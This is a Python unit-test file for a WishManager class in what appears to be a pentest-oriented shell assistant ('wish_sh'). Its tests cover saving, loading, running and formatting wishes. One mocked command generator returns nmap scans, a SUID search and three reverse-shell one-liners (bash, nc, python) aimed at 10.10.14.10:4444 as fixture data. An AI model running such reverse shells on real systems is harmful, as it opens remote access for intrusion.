import json
from unittest.mock import MagicMock, mock_open, patch

from wish_models import WishState
from wish_models.test_factories import WishDoingFactory, WishDoneFactory

from wish_sh.test_factories.settings_factory import SettingsFactory
from wish_sh.wish_manager import WishManager
from wish_sh.wish_paths import WishPaths


class TestWishManager:
    def test_initialization(self):
        """Test that WishManager initializes with the correct attributes."""
        settings = SettingsFactory.create()

        with patch.object(WishPaths, "ensure_directories") as mock_ensure_dirs:
            manager = WishManager(settings)

            assert manager.settings == settings
            assert isinstance(manager.paths, WishPaths)
            assert manager.current_wish is None
            assert hasattr(manager, 'executor')
            assert hasattr(manager, 'tracker')
            mock_ensure_dirs.assert_called_once()

    @patch("builtins.open", new_callable=mock_open)
    def test_save_wish(self, mock_file):
        """Test that save_wish writes the wish to the history file."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)
        wish = WishDoneFactory.create()

        manager.save_wish(wish)

        mock_file.assert_called_with(manager.paths.history_path, "a")
        mock_file().write.assert_called_once()
        # Check that the written string is valid JSON and contains the wish data
        written_data = mock_file().write.call_args[0][0].strip()
        wish_dict = json.loads(written_data)
        assert wish_dict["id"] == wish.id
        assert wish_dict["wish"] == wish.wish

    @patch("builtins.open", new_callable=mock_open)
    def test_load_wishes_empty_file(self, mock_file):
        """Test that load_wishes returns an empty list when the history file is empty."""
        mock_file.return_value.__enter__.return_value.readlines.return_value = []

        settings = SettingsFactory.create()
        manager = WishManager(settings)

        wishes = manager.load_wishes()

        assert wishes == []

    @patch("builtins.open", new_callable=mock_open)
    def test_load_wishes_with_data(self, mock_file):
        """Test that load_wishes returns the expected wishes when the history file has data."""
        wish1 = {
            "id": "id1",
            "wish": "Wish 1",
            "state": WishState.DONE,
            "created_at": "2023-01-01T00:00:00",
            "finished_at": "2023-01-01T01:00:00",
        }
        wish2 = {
            "id": "id2",
            "wish": "Wish 2",
            "state": WishState.DOING,
            "created_at": "2023-01-02T00:00:00",
            "finished_at": None,
        }
        mock_file.return_value.__enter__.return_value.readlines.return_value = [
            json.dumps(wish1) + "\n",
            json.dumps(wish2) + "\n",
        ]

        settings = SettingsFactory.create()
        manager = WishManager(settings)

        wishes = manager.load_wishes()

        assert len(wishes) == 2
        assert wishes[0].id == "id2"  # Most recent first
        assert wishes[0].wish == "Wish 2"
        assert wishes[0].state == WishState.DOING
        assert wishes[1].id == "id1"
        assert wishes[1].wish == "Wish 1"
        assert wishes[1].state == WishState.DONE

    def test_generate_commands(self):
        """Test that generate_commands returns the expected commands based on the wish text."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)

        # Mock the generate_commands method
        def mock_generate_commands(wish_text):
            wish_text = wish_text.lower()
            if "scan port" in wish_text:
                return [
                    "sudo nmap -p- -oA tcp 10.10.10.40",
                    "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40"
                ]
            elif "find suid" in wish_text:
                return ["find / -perm -u=s -type f 2>/dev/null"]
            elif "reverse shell" in wish_text:
                return [
                    "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                    "nc -e /bin/bash 10.10.14.10 4444",
                    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    "s.connect((\"10.10.14.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                    "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
                ]
            else:
                return [
                    f"echo 'Executing wish: {wish_text}'",
                    f"echo 'Processing {wish_text}' && ls -la",
                    "sleep 5"
                ]

        # Replace the generate_commands method with our mock
        manager.generate_commands = mock_generate_commands

        # Test with "scan port" in the wish text
        commands = manager.generate_commands("scan port 80")
        assert len(commands) == 2
        assert "nmap" in commands[0]

        # Test with "find suid" in the wish text
        commands = manager.generate_commands("find suid files")
        assert len(commands) == 1
        assert "find / -perm -u=s" in commands[0]

        # Test with "reverse shell" in the wish text
        commands = manager.generate_commands("create a reverse shell")
        assert len(commands) == 3
        assert any("bash -i" in cmd for cmd in commands)

        # Test with other wish text
        commands = manager.generate_commands("some other wish")
        assert len(commands) == 3
        assert any("echo" in cmd for cmd in commands)

    def test_execute_command(self):
        """Test that execute_command delegates to the executor."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)

        # Mock the executor
        manager.executor = MagicMock()

        wish = WishDoingFactory.create()
        command = wish.command_results[0].command
        cmd_num = 1

        # Execute the command
        manager.execute_command(wish, command, cmd_num)

        # Verify that executor.execute_command was called with the correct arguments
        manager.executor.execute_command.assert_called_once_with(wish, command, cmd_num)

    def test_check_running_commands(self):
        """Test that check_running_commands delegates to the executor."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)

        # Mock the executor
        manager.executor = MagicMock()

        # Check running commands
        manager.check_running_commands()

        # Verify that executor.check_running_commands was called
        manager.executor.check_running_commands.assert_called_once()

    def test_cancel_command(self):
        """Test that cancel_command delegates to the executor."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)
        wish = WishDoingFactory.create()

        # Mock the executor
        manager.executor = MagicMock()
        manager.executor.cancel_command.return_value = "Command 1 cancelled."

        # Cancel a command
        cmd_index = 1
        response = manager.cancel_command(wish, cmd_index)

        # Verify that executor.cancel_command was called with the correct arguments
        manager.executor.cancel_command.assert_called_once_with(wish, cmd_index)
        assert response == "Command 1 cancelled."

    def test_format_wish_list_item_doing(self):
        """Test that format_wish_list_item formats a wish in DOING state correctly."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)

        wish = WishDoingFactory.create()
        wish.state = WishState.DOING

        formatted = manager.format_wish_list_item(wish, 1)

        assert "[1]" in formatted
        assert wish.wish[:10] in formatted
        assert "doing" in formatted.lower()

    def test_format_wish_list_item_done(self):
        """Test that format_wish_list_item formats a wish in DONE state correctly."""
        settings = SettingsFactory.create()
        manager = WishManager(settings)

        wish = WishDoneFactory.create()

        formatted = manager.format_wish_list_item(wish, 1)

        assert "[1]" in formatted
        assert "done" in formatted.lower()
